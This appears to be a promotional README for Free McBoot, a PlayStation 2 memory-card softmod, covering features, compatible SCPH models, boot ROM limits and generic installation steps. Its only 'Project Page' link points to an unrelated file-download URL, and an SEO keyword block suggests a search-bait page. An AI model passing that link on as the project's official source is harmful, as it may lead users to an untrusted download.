<h1 align="center">Free McBoot (FMCB)</h1>

<p align="center">
  <strong>Memory Card Boot. Homebrew Access. System Integration.</strong>
</p>

<p align="center">
  Free McBoot is a PlayStation 2 memory-card softmod for launching homebrew applications through a customized system menu.
  <br>
  Custom Boot Menu · Memory Card Installation · Homebrew Launching · Configuration
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file">
    <img src="https://img.shields.io/badge/PROJECT%20PAGE-1F2937?style=for-the-badge" alt="Free McBoot Project Page">
  </a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/platform-PLAYSTATION%202-374151?style=flat-square">
  <img src="https://img.shields.io/badge/category-CUSTOM%20BOOT%20SOFTWARE-374151?style=flat-square">
  <img src="https://img.shields.io/badge/type-MEMORY%20CARD%20SOFTMOD-374151?style=flat-square">
</p>

<details>
<summary>Contents</summary>

- [Product Overview](#-product-overview)
- [Technical Architecture](#-technical-architecture)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Supported Platforms](#-supported-platforms)
- [Compatibility Information](#-compatibility-information)
- [Technical Specifications](#-technical-specifications)
- [Installation Guide](#-installation-guide)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## Product Overview

Free McBoot (FMCB), also known as Free Memory Card Boot, is a PlayStation 2 memory-card softmod that enables homebrew software to be launched through a customized console startup menu.

FMCB is installed on a compatible PS2 memory card. It uses the console's existing boot and system menu mechanisms rather than replacing the console BIOS. When a compatible installation is detected, the modified menu provides access to configured homebrew launch entries.

FMCB is a software-based boot method, not a conventional replacement firmware image. Its operation depends on the console's hardware revision, boot ROM behavior, region, and memory card compatibility.

## Technical Architecture

### Memory Card-Based Installation

FMCB stores its installation files and configuration on a PlayStation 2 memory card. The console reads the installed system update components during its startup process.

### OSDSYS Integration

The project modifies the behavior of the PlayStation 2 on-screen system menu, commonly referred to as OSDSYS, to provide additional application launch entries.

### Homebrew Execution

The customized menu can launch compatible PlayStation 2 homebrew applications. Executable files commonly used by PS2 homebrew have the `.ELF` extension.

### Configuration

FMCB uses configuration data to define menu entries and related startup behavior. The available options depend on the installed release and configuration tools.

## Key Features

### Boot Environment
- **Memory Card Boot** — Loads the FMCB environment from a compatible memory card.
- **Custom System Menu** — Integrates additional launch entries into the PS2 startup menu.
- **Homebrew Entry Points** — Provides access to configured homebrew applications.
- **Startup Configuration** — Supports configurable menu and launch behavior.

### Application Launching
- **ELF Application Support** — Launches compatible PS2 homebrew executable files.
- **External Storage Access** — Can be configured to launch applications from supported storage locations.
- **Application Shortcuts** — Provides menu entries for configured software.
- **Homebrew Integration** — Works as a launch environment for compatible PS2 applications.

### Installation and Configuration
- **Memory Card Installation** — Stores the boot environment on a compatible PS2 memory card.
- **Installation Modes** — The installer provides different installation modes for console and region compatibility.
- **Configuration Files** — Uses FMCB configuration data for menu customization.
- **Multi-Installation** — Supports installation modes designed for broader console compatibility.

## Module Overview

| Component | Description | Status |
|---|---|---|
| FMCB Installer | Installs FMCB files onto a compatible memory card | Core component |
| FMCB Loader | Loads the customized boot environment | Core component |
| OSDSYS Integration | Adds configured launch entries to the system menu | Core component |
| Configuration System | Stores menu and startup settings | Core component |
| ELF Launch Interface | Provides access to compatible homebrew executables | Core component |
| Multi-Install Support | Provides installation options for broader compatibility | Installer feature |
| Memory Card Storage | Stores FMCB installation and configuration files | Required medium |

## Supported Platforms

| Platform | Model / Revision | Compatibility |
|---|---|---|
| PlayStation 2 Fat | SCPH-10000 to SCPH-500xx families | Generally supported; verify model-specific requirements |
| PlayStation 2 Slim | SCPH-700xx to SCPH-790xx families | Generally supported |
| PlayStation 2 Slim | SCPH-900xx with boot ROM below 2.30 | Generally supported |
| PlayStation 2 Slim | SCPH-900xx with boot ROM 2.30 or newer | Standard FMCB autonomous boot is not supported |
| PlayStation 2 TV | Specific hardware and boot ROM configuration | Standard FMCB autonomous boot is not supported |

## Compatibility Information

FMCB compatibility is determined by more than the console's product name.

Before installation, identify:

- The complete SCPH model number.
- The console's boot ROM version.
- The console region.
- The memory card's compatibility with the required MagicGate behavior.
- Whether the console has an existing hardware modification that may affect FMCB behavior.

Late SCPH-900xx Slim systems with boot ROM 2.30 or newer do not support standard autonomous FMCB boot. Fortuna or FunTuna-based approaches may be relevant for certain systems in this category.

Datecode alone is not conclusive for transitional production units. Confirm the boot ROM version when determining compatibility.

Memory card compatibility also matters. Some third-party cards do not correctly support the authentication behavior required by FMCB. A compatible official 8 MB PlayStation 2 memory card is a commonly recommended installation medium.

## Technical Specifications

| Parameter | Details |
|---|---|
| Project Name | Free McBoot |
| Abbreviation | FMCB |
| Target Platform | PlayStation 2 |
| Project Category | Memory Card Softmod |
| Boot Integration | OSDSYS |
| Installation Medium | PlayStation 2 Memory Card |
| Executable Format | ELF |
| Configuration | FMCB configuration files |
| BIOS Replacement | No |
| Latest Stable Version Referenced | 1.966 |
| Developer / Maintainer History | Neme, jimmikaelkael, SP193 and contributors |

## Installation Guide

1. Identify the PlayStation 2 model number and boot ROM version.
2. Confirm that the console supports the intended FMCB boot method.
3. Prepare a compatible PlayStation 2 memory card.
4. Obtain the FMCB installer from a trusted project source.
5. Establish a supported method of launching the installer on the console.
6. Run the installer and select the installation mode appropriate for the target console and region.
7. Complete the installation on the memory card.
8. Restart the console with the installed memory card inserted.
9. Verify that the FMCB menu loads and that configured homebrew entries are available.

Copying installer files to a memory card using a standard PC file manager does not by itself create a valid FMCB installation. The installer must be executed through an appropriate PlayStation 2 entry point.

## FAQ

### 1. Is Free McBoot a replacement for the PlayStation 2 BIOS?

No. FMCB is a memory-card softmod that uses the console's boot and system menu behavior. It does not replace the BIOS.

### 2. Does Free McBoot work on every PlayStation 2?

No. Most Fat and many Slim models support standard FMCB boot, but late SCPH-900xx systems with boot ROM 2.30 or newer do not autonomously boot standard FMCB.

### 3. Does FMCB require a special memory card?

It requires a compatible PlayStation 2 memory card. MagicGate behavior is relevant to installation, and some third-party cards may not work reliably.

### 4. Can Free McBoot launch homebrew applications?

Yes. Its customized menu can launch compatible homebrew applications, including software distributed as PS2 ELF executables.

### 5. What is the difference between FMCB and FreeHDBoot?

FMCB is installed on a memory card. FreeHDBoot (FHDB) is a related approach that uses the internal hard drive on compatible Fat PlayStation 2 systems.

## SEO Keywords

Free McBoot, FMCB PlayStation 2, PS2 Free McBoot, PS2 memory card softmod, PlayStation 2 homebrew, FMCB installation, PS2 custom boot menu, PS2 OSDSYS modification, PS2 ELF launcher, PS2 homebrew loader, Free McBoot compatibility, PS2 boot ROM compatibility, SCPH-900xx FMCB, PS2 MagicGate memory card, FMCB installer, FreeHDBoot comparison, PS2 system menu modification, PlayStation 2 software modification, PS2 homebrew environment, FMCB 1.966

<p align="center">
  <strong>Free McBoot (FMCB)</strong>
  <br>
  PlayStation 2 · Memory Card Boot · Homebrew Environment
  <br>
  Console Firmware Software
</p>
